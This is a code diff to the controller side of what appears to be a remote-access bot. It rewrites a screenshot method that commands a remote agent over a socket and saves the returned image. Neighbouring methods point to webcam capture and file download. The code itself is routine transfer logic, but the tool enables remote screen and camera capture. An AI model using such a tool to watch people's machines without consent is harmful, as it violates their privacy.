@@ -186,32 +186,58 @@ class Bot:
             return False, f"Download error: {str(e)}", None
 
     def screenshot(self):
-        os.makedirs(SCREENSHOT_DIR, exist_ok=True)
-        count = len(os.listdir(SCREENSHOT_DIR))
-        file_name = f'{SCREENSHOT_DIR}/screenshot_{count}.png'
-        
+        """Take a screenshot from the agent.
+        Returns:
+            tuple: (success, message, file_path)
+        """
         try:
-            f = open(file_name, 'wb')
-        except IOError as e:
-            return f"Error opening file {file_name} for writing: {e}"
+            # Create screenshots directory if it doesn't exist
+            os.makedirs(SCREENSHOT_DIR, exist_ok=True)
             
-        self.target.settimeout(SCREENSHOT_TIMEOUT)
-        chunk = None
-        try:
-            while True:
-                try:
-                    if chunk is not None:
+            # Send screenshot command
+            if not self.reliable_send('screenshot'):
+                return False, "Failed to send screenshot command", None
+            
+            # Get response with file size
+            response = self.reliable_recv()
+            if not response or response.get('error'):
+                error = response.get('error', 'No response from agent') if response else 'No response from agent'
+                return False, error, None
+            
+            try:
+                file_size = response.get('size', 0)
+                if not file_size:
+                    return False, "Invalid file size received", None
+                
+                # Generate unique filename
+                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+                filename = f'screenshot_{self.id}_{timestamp}.png'
+                filepath = os.path.join(SCREENSHOT_DIR, filename)
+                
+                # Receive and save screenshot data
+                received = 0
+                with open(filepath, 'wb') as f:
+                    while received < file_size:
+                        chunk = self.target.recv(min(4096, file_size - received))
+                        if not chunk:
+                            break
                         f.write(chunk)
-                    chunk = self.target.recv(IMAGE_CHUNK_SIZE)
-                except socket.timeout:
-                    break
-        except socket.error as e:
-            f.close()
-            return f"Error receiving data: {e}"
-        finally:
-            f.close()
-        self.target.settimeout(None)
-        return f"Screenshot saved to {file_name}"
+                        received += len(chunk)
+                    
+                if received == file_size:
+                    logging.info(f"Screenshot saved - Session {self.id} | File: {filepath}")
+                    return True, "Screenshot saved successfully", filepath
+                else:
+                    os.remove(filepath)  # Clean up incomplete file
+                    return False, "Screenshot transfer incomplete", None
+                
+            except Exception as e:
+                logging.error(f"Error receiving screenshot - Session {self.id} | Error: {e}")
+                return False, f"Error receiving screenshot: {str(e)}", None
+            
+        except Exception as e:
+            logging.error(f"Screenshot error - Session {self.id} | Error: {e}")
+            return False, f"Screenshot error: {str(e)}", None
 
     def webcam(self):
         os.makedirs(WEBCAM_DIR, exist_ok=True)
